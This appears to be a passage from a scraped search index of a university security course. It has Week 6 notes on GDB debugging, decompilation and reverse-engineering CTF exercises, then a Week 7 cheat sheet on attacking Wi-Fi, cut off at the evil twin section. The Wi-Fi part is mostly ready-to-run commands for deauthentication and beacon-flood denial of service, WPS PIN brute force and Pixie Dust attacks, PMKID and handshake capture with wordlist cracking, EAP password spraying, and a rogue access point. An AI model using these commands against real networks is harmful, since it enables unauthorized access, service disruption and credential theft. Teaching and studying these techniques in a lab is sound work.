0x8048548 <main+25>: call 0x80483a0 <malloc@plt> 0x804854d <main+30>: add $0x10,%esp 0x8048550 <main+33>: sub $0xc,%esp","title":"Example Usage"},{"location":"CS315/Week%206/#deleting-views","text":"If for whatever reason, a view no long suits your needs simply call (gdb) info display which will give you a list of active displays: Auto-display expressions now in effect: Num Enb Expression 1: y /10bi $pc-0x5 Then simply execute (gdb) delete display 1 and your execution will resume without the display.","title":"Deleting Views"},{"location":"CS315/Week%206/#registers","text":"In order to view the state of registers with vanilla gdb, you need to run the command info registers which will display the state of all the registers: eax 0xf77a6ddc -142971428 ecx 0xffe06b10 -2069744 edx 0xffe06b34 -2069708 ebx 0x0 0 esp 0xffe06af8 0xffe06af8 ebp 0x0 0x0 esi 0xf77a5000 -142979072 edi 0xf77a5000 -142979072 eip 0x804853a 0x804853a <main+11> eflags 0x286 [ PF SF IF ] cs 0x23 35 ss 0x2b 43 ds 0x2b 43 es 0x2b 43 fs 0x0 0 gs 0x63 99 If you simply would like to see the contents of a single register, the notation x/x $[register] where: x/x means display the address in hex notation $[register] is the register code such as eax, rax, etc.","title":"Registers"},{"location":"CS315/Week%206/#pwndbg","text":"These commands work with vanilla gdb as well.","title":"Pwndbg"},{"location":"CS315/Week%206/#setting-breakpoints","text":"Setting breakpoints in GDB uses the format b*[Address/Symbol]","title":"Setting Breakpoints"},{"location":"CS315/Week%206/#example-usage_1","text":"(gdb) b*main : Break at the start (gdb) b*0x804854d : Break at 0x804854d (gdb) b*0x804854d-0x100 : Break at 0x804844d","title":"Example Usage"},{"location":"CS315/Week%206/#deleting-breakpoints","text":"As before, in order to delete a view, you can list the available breakpoints using (gdb) info breakpoints (don't forget about GDB's autocomplete, you don't always need to type out every command!) which will display all breakpoints: Num Type Disp Enb Address What 1 breakpoint keep y 0x0804852f <main> 3 breakpoint keep y 0x0804864d <__libc_csu_init+61> Then simply execute (gdb) delete 1 Note GDB creates breakpoints chronologically and does NOT reuse numbers.","title":"Deleting Breakpoints"},{"location":"CS315/Week%206/#stepping","text":"What good is a debugger if you can't control where you are going? In order to begin execution of a program, use the command r [arguments] similar to how if you ran it with dot-slash notation you would execute it ./program [arguments] . In this case the program will run normally and if no breakpoints are set, you will execute normally. If you have breakpoints set, you will stop at that instruction. (gdb) continue [# of breakpoints] : Resumes the execution of the program until it finishes or until another breakpoint is hit (shorthand c ) (gdb) step[# of instructions] : Steps into an instruction the specified number of times, default is 1 (shorthand s ) (gdb) next instruction [# of instructions] : Steps over an instruction meaning it will not delve into called functions (shorthand ni ) (gdb) finish : Finishes a function and breaks after it gets returned (shorthand fin )","title":"Stepping"},{"location":"CS315/Week%206/#examining","text":"Examining data in GDB is also very useful for seeing how the program is affecting data. The notation may seem complex at first, but it is flexible and provides powerful functionality. (gdb) x/[#][size][format] [Address/Symbol/Register][\u00b1 offset] x/ means examine [#] means how much [size] means what size the data should be such as a word w (2 bytes), double word d (4 bytes), or giant word g (8 bytes) [format] means how the data should be interpreted such as an instruction i , a string s , hex bytes x [Address/Symbol][\u00b1 offset] means where to start interpreting the data","title":"Examining"},{"location":"CS315/Week%206/#example-usage_2","text":"(gdb) x/x $rax : Displays the content of the register RAX as hex bytes (gdb) x/i 0xdeadbeef : Displays the instruction at address 0xdeadbeef (gdb) x/10s 0x893e10 : Displays 10 strings at the address (gdb) x/10gx 0x7fe10 : Displays 10 giant words as hex at the address","title":"Example Usage"},{"location":"CS315/Week%206/#forking","text":"If the program happens to be an accept-and-fork server, gdb will have issues following the child or parent processes. In order to specify how you want gdb to function you can use the command set follow-fork-mode [on/off]","title":"Forking"},{"location":"CS315/Week%206/#setting-data","text":"If you would like to set data at any point, it is possible using the command set [Address/Register]=[Hex Data]","title":"Setting Data"},{"location":"CS315/Week%206/#example-usage_3","text":"set $rax=0x0 : Sets the register rax to 0 set 0x1e4a70=0x123 : Sets the data at 0x1e4a70 to 0x123","title":"Example Usage"},{"location":"CS315/Week%206/#process-mapping","text":"A handy way to find the process's mapped address spaces is to use info proc map : Mapped address spaces: Start Addr End Addr Size Offset objfile 0x8048000 0x8049000 0x1000 0x0 /directory/program 0x8049000 0x804a000 0x1000 0x0 /directory/program 0x804a000 0x804b000 0x1000 0x1000 /directory/program 0xf75cb000 0xf75cc000 0x1000 0x0 0xf75cc000 0xf7779000 0x1ad000 0x0 /lib32/libc-2.23.so 0xf7779000 0xf777b000 0x2000 0x1ac000 /lib32/libc-2.23.so 0xf777b000 0xf777c000 0x1000 0x1ae000 /lib32/libc-2.23.so 0xf777c000 0xf7780000 0x4000 0x0 0xf778b000 0xf778d000 0x2000 0x0 [vvar] 0xf778d000 0xf778f000 0x2000 0x0 [vdso] 0xf778f000 0xf77b1000 0x22000 0x0 /lib32/ld-2.23.so 0xf77b1000 0xf77b2000 0x1000 0x0 0xf77b2000 0xf77b3000 0x1000 0x22000 /lib32/ld-2.23.so 0xf77b3000 0xf77b4000 0x1000 0x23000 /lib32/ld-2.23.so 0xffc59000 0xffc7a000 0x21000 0x0 [stack] This will show you where the stack, heap (if there is one), and libc are located.","title":"Process Mapping"},{"location":"CS315/Week%206/#attaching-processes","text":"Another useful feature of GDB is to attach to processes which are already running. Simply launch gdb using gdb , then find the process id of the program you would like to attach to an execute attach [pid] .","title":"Attaching Processes"},{"location":"CS315/Week%206/#decompilers","text":"Decompilers do the impossible and reverse compiled code back into psuedocode/code. IDA offers HexRays, which translates machine code into a higher language pseudocode.","title":"Decompilers"},{"location":"CS315/Week%206/#example-workflow","text":"Let's say we are disassembling a program which has the source code: #include <stdio.h> void printSpacer(int num){ for(int i = 0; i < num; ++i){ printf(\"-\"); } printf(\"\\n\"); } int main() { char* string = \"Hello, World!\"; for(int i = 0; i < 13; ++i){ printf(\"%c\", string[i]); for(int j = i+1; j < 13; j++){ printf(\"%c\", string[j]); } printf(\"\\n\"); printSpacer(13 - i); } return 0; } And creates an output of: Hello, World! ------------- ello, World! ------------ llo, World! ----------- lo, World! ---------- o, World! --------- , World! -------- World! ------- World! ------ orld! ----- rld! ---- ld! --- d! -- ! - If we are given a binary compiled from that source and we want to figure out how the source looks, we can use a decompiler to get c pseudocode which we can then use to reconstruct the function. The sample decompilation can look like: printSpacer: int __fastcall printSpacer(int a1) { int i; // [rsp+8h] [rbp-8h] for ( i = 0; i < a1; ++i ) printf(\"-\"); return printf(\"\\n\"); } main: int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [rsp+18h] [rbp-18h] signed int i; // [rsp+1Ch] [rbp-14h] for ( i = 0; i < 13; ++i ) { v4 = i + 1; printf(\"%c\", (unsigned int)aHelloWorld[i], envp); while ( v4 < 13 ) printf(\"%c\", (unsigned int)aHelloWorld[v4++]); printf(\"\\n\"); printSpacer(13 - i); } return 0; } A good method of getting a good representation of the source is to convert the decompilation into Python since Python is basically psuedocode that runs. Starting with main often allows you to gain a good overview of what the program is doing and will help you translate the other functions.","title":"Example Workflow"},{"location":"CS315/Week%206/#main","text":"We know we will start with a main function and some variables, if you trace the execution of the variables, you can oftentimes determine the variable type. Because i is being used as an index, we know its an int, and because v4 used as one later on, it too is an index. We can also see that we have a variable aHelloWorld being printed with \"%c\", we can determine it represents the 'Hello, World!' string. Lets define all these variables in our Python main function: def main(): string = \"Hello, World!\" i = 0 v4 = 0 for i in range(0, 13): v4 = i + 1 print(string[i], end='') while v4 < 13: print(string[v4], end='') v4 += 1 print() printSpacer(13-i)","title":"Main"},{"location":"CS315/Week%206/#printspacer-function","text":"Now we can see that printSpacer is clearly being fed an int value. Translating it into python shouldn't be too hard. def printSpacer(number): i = 0 for i in range(0, number): print(\"-\", end='') print()","title":"printSpacer Function"},{"location":"CS315/Week%206/#results","text":"Running main() gives us: Hello, World! ------------- ello, World! ------------ llo, World! ----------- lo, World! ---------- o, World! --------- , World! -------- World! ------- World! ------ orld! ----- rld! ---- ld! --- d! -- ! -","title":"Results"},{"location":"CS315/Week%206/#exercise","text":"","title":"Exercise"},{"location":"CS315/Week%206/#4-pt-de-android","text":"Android source code is easy to de-compile. Rather than reading assembly codes from the beginning, why not try some java first? Try to reverse this Android apk file and find flag in it. Flag format: CTFlearn{******} flag.apk Hint1: if you really have difficult to reverse Android, I would recommend you to try jadx. Hint2: md5 is old and not safe. So many methods can help you to crack md5.","title":"(4 pt) De-Android"},{"location":"CS315/Week%206/#4-pt-touhou-players-win-twice","text":"I heard that some SUSTCers are really good at playing Touhou Project (\u6771\u65b9project) Games. As a kind of STG game, Touhou Project is very difficult and not friendly for beginners. Some one sent me this game and challenged me: if you can pass all 6 levels in Lunatic difficulty, you can have the flag. Each time you finish a level in Lunatic difficulty, one part of flag is given to flag.txt under the game directory. I have several ideas for you to break this game: As a real touhou player, you can play this game until you finish all levels. As a reverse engineer, you may observe the assembly codes and find how flag is given after each level. As a game trainer developer, you also can write a cheat for this game. As a social engineer, you can convince CS315's professor and TAs to tell you the flag. Good luck! https://mega.nz/file/KtNkiZga#juXA-LhgguC8De76CTYnHjPaObvlNcyjyEDXjhkSDCs","title":"(4 pt) Touhou Players Win Twice"},{"location":"CS315/Week%206/#2-pt-javaisez3","text":"3rd round of your local Java rev! Note: This requires Java 11 and above to run. javaisez3.jar","title":"(2 pt) javaisez3"},{"location":"CS315/Week%207/","text":"Week7 WLAN: Attacking WiFi Wifi basic commands ip link show #List available interfaces iwconfig #List available interfaces airmon-ng check kill #Kill annoying processes airmon-ng start wlan0 #Monitor mode airmon-ng stop wlan0mon #Managed mode airodump-ng wlan0mon #Scan (default 2.4Ghz) airodump-ng wlan0mon --band a #Scan 5Ghz iwconfig wlan0 mode monitor #Put in mode monitor iwconfig wlan0mon mode managed #Quit mode monitor - managed mode iw dev wlan0 scan | grep \"^BSS\\|SSID\\|WSP\\|Authentication\\|WPS\\|WPA\" #Scan available wifis Tools EAPHammer git clone https://github.com/s0lst1c3/eaphammer.git ./kali-setup Airgeddon mv `which dhcpd` `which dhcpd`.old apt install isc-dhcp-server apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe Run airgeddon with docker docker run \\ --rm \\ -ti \\ --name airgeddon \\ --net=host \\ --privileged \\ -p 3000:3000 \\ -v /tmp:/io \\ -e DISPLAY=$(env | grep DISPLAY | awk -F \"=\" '{print $2}') \\ v1s1t0r1sh3r3/airgeddon From: https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux Resume attacks DoS Deauthentication/disassociation -- Disconnect everyone (or a specific ESSID/Client) Random fake APs -- Hide nets, possible crash scanners) Overload AP -- Try to kill the AP (usually not very useful) WIDS -- Play with the IDS TKIP, EAPOL -- Some specific attacks to DoS some APs Cracking Crack WEP (several tools and methods) WPA-PSK WPS pin \"Brute-Force\" WPA PMKID bruteforce [DoS +] WPA handshake capture + Cracking WPA-MGT Username capture Bruteforce Credentials Evil Twin (with or without DoS) Open Evil Twin [+ DoS] -- Useful to capture captive portal creds and/or perform LAN attacks WPA-PSK Evil Twin -- Useful to network attacks if you know the password WPA-MGT -- Useful to capture company credentials MANA , Loud MANA , Known beacon + Open -- Useful to capture captive portal creds and/or perform LAN attacks + WPA -- Useful to capture WPA handshakes DOS Deauthentication Packets The most common way this sort of attack is done is with deauthentication packets. These are a type of \"management\" frame responsible for disconnecting a device from an access point. Forging these packets is the key to hacking many Wi-Fi networks , as you can forcibly disconnect any client from the network at any time. The ease of which this can be done is somewhat frightening and is often done as part of gathering a WPA handshake for cracking. Aside from momentarily using this disconnection to harvest a handshake to crack, you can also just let those deauths keep coming, which has the effect of peppering the client with deauth packets seemingly from the network they are connected to. Because these frames aren't encrypted, many programs take advantage of management frames by forging them and sending them to either one or all devices on a network. Description from here . Deauthentication using Aireplay-ng aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0 -0 means deauthentication 1 is the number of deauths to send (you can send multiple if you wish); 0 means send them continuously -a 00:14:6C:7E:40:80 is the MAC address of the access point -c 00:0F:B5:34:30:30 is the MAC address of the client to deauthenticate; if this is omitted then broadcast deauthentication is sent (not always work) ath0 is the interface name Disassociation Packets Disassociation packets are another type of management frame that is used to disconnect a node (meaning any device like a laptop or cell phone) from a nearby access point. The difference between deauthentication and disassociation frames is primarily the way they are used. An AP looking to disconnect a rogue device would send a deauthentication packet to inform the device it has been disconnected from the network, whereas a disassociation packet is used to disconnect any nodes when the AP is powering down, rebooting, or leaving the area. Description from here . This attack can be performed by mdk4(mode \"d\"): # -c <channel> # -b victim_client_mac.txt contains the MAC address of the device to eliminate # -e WifiName is the name of the wifi # -B BSSID is the BSSID of the AP # Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F More DOS attacks by mdk4 From here . ATTACK MODE b: Beacon Flooding Sends beacon frames to show fake APs at clients. This can sometimes crash network scanners and even drivers! # -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit # -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES) # -m use real BSSIDS # All the parameters are optional and you could load ESSIDs from a file mdk4 wlan0mon b -a -w nta -m ATTACK MODE a: Authentication Denial-Of-Service Sends authentication frames to all APs found in range. Too many clients can freeze or reset several APs. # -a BSSID send random data from random clients to try the DoS # -i BSSID capture and repeat pakets from authenticated clients # -m use real MACs # only -a or -i can be used mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m ATTACK MODE p: SSID Probing and Bruteforcing Probes APs and checks for answer, useful for checking if SSID has been correctly decloaked and if AP is in your sending range. Bruteforcing of hidden SSIDs with or without a wordlist is also available. ATTACK MODE m: Michael Countermeasures Exploitation Sends random packets or re-injects duplicates on another QoS queue to provoke Michael Countermeasures on TKIP APs . AP will then shutdown for a whole minute, making this an effective DoS . # -t <BSSID> of a TKIP AP # -j use inteligent replay to create the DoS mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j] ATTACK MODE e: EAPOL Start and Logoff Packet Injection Floods an AP with EAPOL Start frames to keep it busy with fake sessions and thus disables it to handle any legitimate clients. Or logs off clients by injecting fake EAPOL Logoff messages . # Use Logoff messages to kick clients mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l] ATTACK MODE s: Attacks for IEEE 802.11s mesh networks Various attacks on link management and routing in mesh networks. Flood neighbors and routes, create black holes and divert traffic! ATTACK MODE w: WIDS Confusion Confuse/Abuse Intrusion Detection and Prevention Systems by cross-connecting clients to multiple WDS nodes or fake rogue APs. # -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts) mkd4 -e <SSID> -c <channel> [-z] ATTACK MODE f: Packet Fuzzer A simple packet fuzzer with multiple packet sources and a nice set of modifiers. Be careful! Airggedon Airgeddon offers most of the attacks proposed in the previous comments: WPS WPS stands for Wi-Fi Protected Setup. It is a wireless network security standard that tries to make connections between a router and wireless devices faster and easier. WPS works only for wireless networks that use a password that is encrypted with the WPA Personal or WPA2 Personal security protocols. WPS doesn't work on wireless networks that are using the deprecated WEP security, which can be cracked easily by any hacker with a basic set of tools and skills. (From here ) WPS uses a 8 length PIN to allow a user to connect to the network, but it's first checked the first 4 numbers and, if correct, then is checked the second 4 numbers. Then, it is possible to Brute-Force the first half and then the second half (only 11000 possibilities). WPS Bruteforce There are 2 main tools to perform this action: Reaver and Bully. Reaver has been designed to be a robust and practical attack against WPS, and has been tested against a wide variety of access points and WPS implementations. Bully is a new implementation of the WPS brute force attack, written in C. It has several advantages over the original reaver code: fewer dependencies, improved memory and cpu performance, correct handling of endianness, and a more robust set of options. It runs on Linux, and was specifically developed to run on embedded Linux systems (OpenWrt, etc) regardless of architecture. Bully provides several improvements in the detection and handling of anomalous scenarios. It has been tested against access points from numerous vendors, and with differing configurations, with much success. If the WPS valid code is found, both Bully and Reaver will use it to discover the WPA/WPA2 PSK used to protect the network, so you will be able to connect anytime you need it. reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3 Smart Brute force Instead of starting trying every possible PIN, you should check if there are available PINs discoveredfor the AP you are attacking (depending of the manufacturer MAC) and the PIN software generated PINs . The database of known PINs is made for Access Points of certain manufacturers for which it is known that they use the same WPS PINs. This database contains the first three octets of MAC-addresses and a list of corresponding PINs that are very likely for this manufacturer. There are several algorithms for generating WPS PINs. For example, ComputePIN and EasyBox use the MAC-address of the Access Point in their calculations. But the Arcadyan algorithm also requires a device ID. WPS Pixie Dust attack Dominique Bongard discovered that some APs have weak ways of generating nonces (known as E-S1 and E-S2 ) that are supposed to be secret. If we are able to figure out what these nonces are, we can easily find the WPS PIN of an AP since the AP must give it to us in a hash in order to prove that it also knowns the PIN, and the client is not connecting to a rouge AP. These E-S1 and E-S2 are essentially the \"keys to unlock the lock box\" containing the WPS pin. More info here: https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack) Basically, some implementations failed in the use of random keys to encrypt the 2 parts of the the PIN(as it is discomposed in 2 parts during the authentication communication and sent to the client), so an offline attack could be used to brute force the valid PIN. reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv bully wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3 Null Pin attack Some really bad implementations allowed the Null PIN to connect (very weird also). Reaver can test this (Bully cannot). reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p '' Airgeddon All the proposed WPS attacks can be easily performed using *airgeddon.* 5 and 6 lets you try your custom PIN (if you have any) 7 and 8 perform the Pixie Dust attack 13 allows you to test the NULL PIN 11 and 12 will recollect the PINs related to the selected AP from available databases and generate possible PINs using: ComputePIN, EasyBox and optionally Arcadyan (recommended, why not?) 9 and 10 will test every possible PIN WEP So broken and disappeared that I am not going to talk about it. Just know that *airgeddon* have a WEP option called \"All-in-One\" to attack this kind of protection. More tools offer similar options. WPA/WPA2 PSK PMKID In 2018 hashcat authors disclosed a new type of attack which not only relies on one single packet , but it doesn\u2019t require any clients to be connected to our target AP or, if clients are connected, it doesn\u2019t require us to send deauth frames to them, there\u2019s no interaction between the attacker and client stations, but just between the attacker and the AP, interaction which, if the router is vulnerable, is almost immediate! It turns out that a lot of modern routers append an optional field at the end of the first EAPOL frame sent by the AP itself when someone is associating, the so called Robust Security Network , which includes something called PMKID As explained in the original post, the PMKID is derived by using data which is known to us: PMKID = HMAC-SHA1-128(PMK, \"PMK Name\" | MAC_AP | MAC_STA) Since the \u201cPMK Name\u201d string is constant, we know both the BSSID of the AP and the station and the PMK is the same one obtained from a full 4-way handshake , this is all hashcat needs in order to crack the PSK and recover the passphrase! Description obtained from here . To gather this information and bruteforce locally the password you can do: airmon-ng check kill airmon-ng start wlan0 git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1 #You can also obtains PMKIDs using eaphammer ./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1 The PMKIDs captured will be shown in the console and also saved inside /tmp/attack.pcap* * Now, convert the capture to hashcat/john** format and crack it: hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt Please note the the format of a correct hash contains 4 parts , like: 4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7*566f6461666f6e65436f6e6e6563743034383131343838 If yours only contains 3 parts , then, it is invalid (the PMKID capture wasn't valid). Note that hcxdumptool also capture handshakes (something like this will appear: MP:M1M2 RC:63258 EAPOLTIME:17091 ). You could transform the handshakes to hashcat / john format using cap2hccapx tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap cap2hccapx pmkid.pcapng pmkid.hccapx [\"Filter_ESSID\"] hccap2john pmkid.hccapx > handshake.john john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes I have noticed that some handshakes captured with this tool couldn't be cracked even knowing the correct password. I would recommend to capture handshakes also via traditional way if possible, or capture several of them using this tool. Handshake capture One way to attack WPA/WPA2 networks is to capture a handshake and try to crack the used password offline . To do so you need to find the BSSID and channel of the victim network, and a client that is connected to the network. Once you have that information you have to start listening to all the commutation of that BSSID in that channel , because hopefully the handshake will be send there: airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap Now you need to deauthenticate the client for a few seconds so it will automatically authenticate again to the AP (please read the part of DoS to find several ways to deauthenticate a client): aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, not always work Note that as the client was deauthenticated it could try to connect to a different AP or, in other cases, to a different network. Once in the airodump-ng appears some handshake information this means that the handshake was captured and you can stop listening: Once the handshake is captured you can crack it with aircrack-ng : aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap Check if handshake in file aircrack aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture tshark tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages. cowpatty cowpatty -r psk-01.cap -s \"ESSID\" -f - If this tool finds an uncompleted handshake of an ESSID before the completed one, it won't detect the valid one. pyrit apt-get install pyrit #Not working for newer versions of kali pyrit -r psk-01.cap analyze WPA Enterprise (MGT) It is important to talk about the different authentication methods that could be used by an enterprise Wifi. For this kind of Wifis you will probably find in airodump-ng something like this: 6A:FE:3B:73:18:FB -58 19 0 0 1 195 WPA2 CCMP MGT NameOfMyWifi EAP (Extensible Authentication Protocol) the skull of the authentication communication , on top of this, an authentication algorithm is used by the server to authenticate the client ( supplicant ) and in same cases by the client to authenticate the server. Main authentication algorithms used in this case: EAP-GTC: Is an EAP method to support the use of hardware tokens and one-time passwords with EAP-PEAP. Its implementation is similar to MSCHAPv2, but does not use a peer challenge. Instead, passwords are sent to the access point in plaintext (very interesting for downgrade attacks). EAP-MD-5 (Message Digest) : The client send the MD5 hash of the password. Not recommended : Vulnrable to dictionary attacks, no server authentication and no way to generate per session wired equivalent privacy (WEP) keys. EAP-TLS (Transport Layer Security) : It relies on client-side and server-side certificates to perform authentication and can be used to dynamically generate user-based and session-based WEP keys to secure subsequent communications. EAP-TTLS (Tunneled Transport Layer Security) : Mutual authentication of the client and network through an encrypted channel (or tunnel), as well as a means to derive dynamic, per-user, per-session WEP keys. Unlike EAP-TLS, EAP-TTLS requires only server-side certificates (client will use credentials) . PEAP (Protected Extensible Authentication Protocol) : PEAP is like the EAP protocol but creating a TLS tunnel to protect the communication. Then, weak authentication protocols can by used on top of EAP as they will be protected by the tunnel. PEAP-MSCHAPv2 : This is also known as just PEAP because it is widely adopted. This is just the vulnerable challenge/response called MSCHAPv2 on to of PEAP (it is protected by the TLS tunnel). PEAP-EAP-TLS or just PEAP-TLS : Is very similar to EAP-TLS but a TLS tunnel is created before the certificates are exchanged. You can find more information about these authentication methods here and here . Username Capture Reading https://tools.ietf.org/html/rfc3748#page-27 it looks like if you are using EAP the \"Identity\" messages must be supported , and the username is going to be sent in clear in the \"Response Identity\" messages. Even using one of the most secure of authentication methods: PEAP-EAP-TLS , it is possible to capture the username sent in the EAP protocol . To do so, capture a authentication communication (start airodump-ng inside a channel and wireshark in the same interface) and filter the packets by eapol . Inside the \" Response, Identity \" packet, the username of the client will appear. Anonymous Identities (Info taken from https://www.interlinknetworks.com/app_notes/eap-peap.htm) Both EAP-PEAP and EAP-TTLS support identity hiding . In a WiFi environment, the access point (AP) typically generates an EAP-Identity request as part of the association process. To preserve anonymity, the EAP client on the user\u2019s system may respond with only enough information to allow the first hop RADIUS server to process the request, as shown in the following examples. EAP-Identity = anonymous In this example, all users will share the pseudo-user-name \u201canonymous\u201d. The first hop RADIUS server is an EAP-PEAP or EAP-TTLS server which drives the server end of the PEAP or TTLS protocol. The inner (protected) authentication type will then be either handled locally or proxied to a remote (home) RADIUS server. EAP-Identity = anonymous@realm_x In this example, users belonging to different realms hide their own identity but indicate which realm they belong to so that the first hop RADIUS server may proxy the EAP-PEAP or EAP-TTLS requests to RADIUS servers in their home realms which will act as the PEAP or TTLS server. The first hop server acts purely as a RADIUS relay node. Alternatively, the first hop server may act as the EAP-PEAP or EAP-TTLS server and either process the protected authentication method or proxy it to another server. This option may be used to configure different policies for different realms. In EAP-PEAP, once the PEAP server and the PEAP client establish the TLS tunnel, the PEAP server generates an EAP-Identity request and transmits it down the TLS tunnel. The client responds to this second EAP-Identity request by sending an EAP-Identity response containing the user\u2019s true identity down the encrypted tunnel. This prevents anyone eavesdropping on the 802.11 traffic from discovering the user\u2019s true identity. EAP-TTLS works slightly differently. With EAP-TTLS, the client typically authenticates via PAP or CHAP protected by the TLS tunnel. In this case, the client will include a User-Name attribute and either a Password or CHAP-Password attribute in the first TLS message sent after the tunnel is established. With either protocol, the PEAP/TTLS server learns the user\u2019s true identity once the TLS tunnel has been established. The true identity may be either in the form user@realm or simply user* *. If the PEAP/TTLS server is also authenticating the user **, it now knows the user\u2019s identity and proceeds with the authentication method being protected by the TLS tunnel. Alternatively, the PEAP/TTLS server may forward a new RADIUS request to the user\u2019s home RADIUS server. This new RADIUS request has the PEAP or TTLS protocol stripped out. If the protected authentication method is EAP, the inner EAP messages are transmitted to the home RADIUS server without the EAP-PEAP or EAP-TTLS wrapper. The User-Name attribute of the outgoing RADIUS message contains the user\u2019s true identity \u2013 not the anonymous identity from the User-Name attribute of the incoming RADIUS request. If the protected authentication method is PAP or CHAP (supported only by TTLS), the User-Name and other authentication attributes recovered from the TLS payload are placed in the outgoing RADIUS message in place of the anonymous User-Name and TTLS EAP-Message attributes included in the incoming RADIUS request. EAP-Bruteforce (password spray) If the client is expected to use a username and password (notice that EAP-TLS won't be valid in this case), then you could try to get a list a usernames (see next part) and passwords and try to bruteforce the access using air-hammer . ./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt You could also do this attack using eaphammer : ./eaphammer --eap-spray \\ --interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \\ --essid example-wifi \\ --password bananas \\ --user-list users.txt Client attacks Theory Network Selection and Roaming Although the 802.11 protocol has very specific rules that dictate how a station can join an ESS, it does not specify how the station should select an ESS to connect to. Additionally, the protocol allows stations to roam freely between access points that share the same ESSID (because you wouldn\u2019t want to lose WiFi connectivity when walking from one end of a building to another, etc). However, the 802.11 protocol does not specify how these access points should be selected. Furthermore, even though stations must be authenticated to the ESS in order to associate with an access point, the 802.11 protocol does not require the access point be authenticated to the station. Preferred Network Lists (PNLs) Each time a station connects to a wireless network, the network\u2019s ESSID is stored in the station\u2019s Preferred Network List (PNL). The PNL is an ordered list of every network that the station has connected to in the past, and each entry in the PNL contains the network\u2019s ESSID and any network-specific configuration information needed to establish a connection. Passive Scanning In infrastructure networks, access points periodically transmit beacon frames to advertise their presence and capabilities to nearby stations. Beacons are broadcast frames, which means they are intended to be received by all nearby stations in range. Beacons include information about the AP\u2019s supported rates, encryption capabilities, additional information, and most importantly, beacon frames contain the AP\u2019s ESSID (as long as ESSID broadcasting is not disabled). During passive scanning, the client device listens for beacon frames from nearby access points. If the client device receives a beacon frame whose ESSID field matches an ESSID from the client\u2019s PNL, the client will automatically connect to the access point that sent the beacon frame. Then, suppose we want to target a wireless device that is not currently connected to any wireless. If we know at least one entry in that client\u2019s PNL, we can force the client to connect to us simply by creating our own access point with that entry\u2019s ESSID. Active Probing The second network selection algorithm used in 802.11 is known as Active Probing. Client devices that use active probing continuously transmit probe request frames to determine what APs are within range, as well as what their capabilities are. Probe requests come in two forms: directed and broadcast. Directed probe requests are addressed to a specific ESSID, and are the client\u2019s way of checking if a specific network is nearby. Clients that use directed probing will send out probe requests for each network in its PNL. It should be noted that directed probing is the only way of identify the presence of nearby hidden networks. Broadcast probe requests work almost exactly the same way, but are sent with the SSID field set to NULL. This addresses the broadcast probe to all nearby access points, allowing the the station to check if any of its preferred networks are nearby without revealing the contents of its PNL Simple AP with redirection to Internet Before explaining how to perform more complex attacks it's going to be explained how to just create an AP and redirect it's traffic to an interface connected to the Internet . Using ifconfig -a check that the wlan interface to create the AP and the interface connected to the Internet are present. DHCP & DNS apt-get install dnsmasq #Manages DHCP and DNS create a config file /etc/dnsmasq.conf as follows: interface=wlan0 dhcp-authoritative dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h dhcp-option=3,192.168.1.1 dhcp-option=6,192.168.1.1 server=8.8.8.8 log-queries log-dhcp listen-address=127.0.0.1 Then set IPs and routes : ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0 route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1 And then start dnsmasq: dnsmasq -C dnsmasq.conf -d hostapd apt-get install hostapd Create a config file hostapd.conf: interface=wlan0 driver=nl80211 ssid=MITIWIFI hw_mode=g channel=11 macaddr_acl=0 ignore_broadcast_ssid=0 auth_algs=1 wpa=2 wpa_passphrase=mitmwifi123 wpa_key_mgmt=WPA-PSK wpa_pairwise=CCMP wpa_group_rekey=86400 ieee80211n=1 wme_enabled=1 Stop annoying processes , set monitor mode , and start hostapd : airmon-ng check kill iwconfig wlan0 mode monitor ifconfig wlan0 up hostapd ./hostapd.conf Forwarding and Redirection iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE iptables --append FORWARD --in-interface wlan0 -j ACCEPT echo 1 > /proc/sys/net/ipv4/ip_forward Evil Twin An evil twin attack is a type Wi-Fi attack that works by taking advantage of the fact that most computers and 